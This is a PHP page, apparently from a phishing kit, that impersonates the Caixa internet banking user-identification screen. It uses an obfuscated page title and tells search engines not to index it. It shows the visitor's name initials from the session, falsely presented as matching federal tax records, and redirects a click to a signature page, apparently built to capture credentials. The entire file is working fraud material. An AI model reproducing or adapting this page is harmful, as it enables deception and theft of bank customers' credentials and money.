<?php
session_start();
?>
<html lang="pt-br">

<head>

    <title>Int_ernet::::Ba:nking_::_:_:cAI_XA</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow, noimageindex">
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
    <!-- CSS -->
    <link rel="stylesheet" href="../../assets/css/bootstrap_desktop.css?v=39">
    <link rel="stylesheet" media="all" href="../../assets/css/login_desktop.css?v=40">
    <link rel="stylesheet" media="all" href="../../assets/css/principal_desktop.css?v=39">
    <link rel="stylesheet" media="all" href="../../assets/css/print.css?v=39">
    <link rel="stylesheet" href="../../assets/css/loading.css?v=38">


    <style type="text/css" name="messageBox">
        .messageBox .msg {
            padding: 20px 28px 8px 66px;
            text-align: left;
            color: #fff;
            line-height: 1.4em;
            font-size: 12px;
            font-weight: bold;
        }

        .messageBox .title {
            display: block;
            text-transform: uppercase;
        }

        .messageBox .iconInfo {
            float: left;
            margin: 20px 10px 0 20px;
            width: 35px;
            height: 31px;
            background: url(../../assets/imgs/imgMessageBox.png) -14px -133px no-repeat;
        }

        .messageBox .iconClose {
            float: right;
            margin: 10px 10px 0 0;
            width: 14px;
            height: 14px;
            background: url(../../assets/imgs/mgMessageBox.png) -15px -189px no-repeat;
            cursor: pointer;
        }

        /* Alert Info ---------- */
        .iconInfoError {
            float: left;
            margin: 0 10px 0 10px;
            width: 100%;
        }

        .iconInfoError span {
            background: url(../../assets/imgs/imgMessageBox.png) -61px -129px no-repeat;
            width: 36px;
            height: 40px;
            position: absolute;
        }

        .textMessageError {
            text-align: justify;
            margin: 16px 0 20px 70px;
            font-size: 12px;
            font-weight: bold;
            color: #4f4f4f;
        }

        .BoxError {
            position: absolute;
            text-align: left;
            clear: both;
            position: relative;
            float: left;
            height: 100%;
            width: 94%;
            padding: 10px;
            background-color: #e7e7e7;
        }

        .arrow {
            width: 0;
            height: 0;
            border-left: 10px solid transparent;
            border-right: 10px solid transparent;
            border-top: 8px solid #e37814;
            border-bottom: none;
            position: absolute;
            bottom: -13px;
            left: 27px;
            padding-bottom: 5px;
        }

        .messageBox .iconClose {
            margin: 10px 10px 0 10px;
        }

        @media (max-width : 992px) {
            .messageBox {
                width: auto;
                max-width: 89%;
            }
        }
    </style>
    <style type="text/css" name="loading">
        /* line 1, loading.css */
        .modalBgLoading {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            *width: 200%;
            *margin: 0 0 0 -14%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            z-index: 99999;
        }

        /* line 12, loading.css */
        .modalBgLoading .loading {
            position: absolute;
            z-index: 65557;
            width: 120px;
            height: 120px;
            background: url(../../assets/imgs/loading.gif) no-repeat center center #fff;
            border-radius: 10px;
            border: 2px solid #fff;
            top: 50%;
            left: 50%;
            margin-left: -60px;
            margin-top: -60px;
        }
    </style>

</head>

<body class="cadastro">
    <div data-component="tabindex"></div>
    <!-- HEADER -->
    <header class="hidden-xs">
        <div class="main">
            <div class="collapse navbar-collapse hidden-sm" id="acessibilidade">
                <ul class="nav navbar-nav acessMenu fonte10 fonteBranca">
                    <li>
                        <a href="#" data-href="conteudo" class="skip altText fonteBranca">Ir para conteúdo</a>
                    </li>
                </ul>
            </div>
        </div>
        <div class="mainHeader | gradient">
            <div class="contentMainHeader">
                <h1 class="brand">
                    <a href="" id="aLogoLink" class="alogo"></a>
                </h1>
            </div>
        </div>
    </header>
    <!-- END HEADER -->
    <!-- MAIN -->
    <div id="delimitarTeclado">
        <div class="main" id="conteudo">

            <div class="container-fluid ajusteMargem">
                <div class="row" id="conteudo-login" hidden="" style="display: block;">
                    <div class="col-lg-9 col-md-9 col-sm-12 col-xs-12">
                        <div class="icoIdentificacaoUsuario iconLogin">
                            <span class="tituloPrincipal" style="margin-top: 0">Identificação
                                do usuário</span>
                        </div>

                        <div class="panel panel-default inputCinza blocLoginCinza">
                            <div class="panel-body painelCinza blocLoginCinza">
                                <p id="titulo" class="fonteXS">AS INICIAIS DO SEU NOME SÃO:</p>
                                <div class="form-group text-center">
                                    <button type="button" id="lnkInitials" class="iniciaisNomeUsuario" style="border-radius: 3px;">
                                        <span class="textHiddenDV">Prezado Cliente, clique nas letras exibidas, se elas estiverem de acordo com as iniciais do seu nome. Caso contrário, clique em Voltar e reinicie sua identificação.</span>
                                        <?php if (empty($_SESSION['iniciais'])) {
                                        } else {
                                            echo ($_SESSION['iniciais']);
                                        } ?> *
                                    </button>
                                </div>

                                <p id="descricao" class="textoDestaque">Prezado Cliente, clique nas letras exibidas, se elas estiverem de acordo com as iniciais do seu nome. Caso contrário, clique em Voltar e reinicie sua identificação.</p>
                                <p id="complemento" class="textoDestaque">*Este dado está de acordo com o registro de Cadastro de Pessoa Física da Receita Federal.</p>
                            </div>
                        </div>
                    </div>
                    <div class="col-lg-3 col-md-3 hidden-sm hidden-xs">
                        <img id="imgBanner" src="../../assets/imgs/18092020_174828_img.png">
                    </div>
                </div>
                <div class="row">
                    <div class="col-md-12 col-xs-12 form-group">
                        <button type="button" id="btnVoltar" name="btnVoltar" class="botaoCinza" title="Voltar" style="border-radius: 3px;">VOLTAR</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="modalBgLoading" style="display: none;">
        <div class="loading"></div>
    </div>
    <div class="rodapePrincipal hidden-xs">
        <div class="main">
            <div class="container-fluid">
                <div class="row sm-m-l-0">
                    <div class="col-lg-4 col-md-4 col-sm-4 hidden-xs rodapeTelefone">
                        <div id="rodapeSuporte" class="rodapeBtEsq fonteBranca">
                            <div>Suporte Tecnológico<br>3004 1104(Capitais) ou 0800 726 0104(Demais regiões)</div>
                        </div>
                    </div>
                    <div class="col-lg-8 col-md-8 col-sm-8 pull-right">
                        <ul class="rodapeNav nav navbar-nav pull-right">
                            <li class="rodapeBtDirEsq">
                                <a id="rodapeSeguranca" class="rodapeLink rodapeBtSeguranca" target="_blank" href="#" tabindex="1">Segurança</a>
                            </li>
                            <li class="rodapeBtDirLinha">
                                <a id="rodapeAtendimentoLink" class="rodapeLink rodapeBtAtendimento" tabindex="2">Rede de Atendimento</a>
                                <a id="rodapeAtendimento" style="display:none" href="#" tabindex="3">.</a>
                            </li>
                            <li class="rodapeBtDirLinha">
                                <a id="rodapeAjudaLink" class="rodapeLink rodapeBtAjuda" tabindex="4">Ajuda</a>
                                <a id="rodapeAjuda" style="display:none" href="#" tabindex="5">.</a>
                            </li>
                            <li class="rodapeBtDir">
                                <a id="rodapeTermosLink" class="rodapeLink rodapeBtTermos" tabindex="6">Termos e Contratos</a>
                                <a id="rodapeTermos" style="display:none" href="#" tabindex="7">.</a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.5.1.js"></script>
    <script>
        $(document).ready(function() {
            $(document).on('click', '.iniciaisNomeUsuario', function() {
                location.href = "assinatura";
            });
        });
    </script>

</body>

</html>